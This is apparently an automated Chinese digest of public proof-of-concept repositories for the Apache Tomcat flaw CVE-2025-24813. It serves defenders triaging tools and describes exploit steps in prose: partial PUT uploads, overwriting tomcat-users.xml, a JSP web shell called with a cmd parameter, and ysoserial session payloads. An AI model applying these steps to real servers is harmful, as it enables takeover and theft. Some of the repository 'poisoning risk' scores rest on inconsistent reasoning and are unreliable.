CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

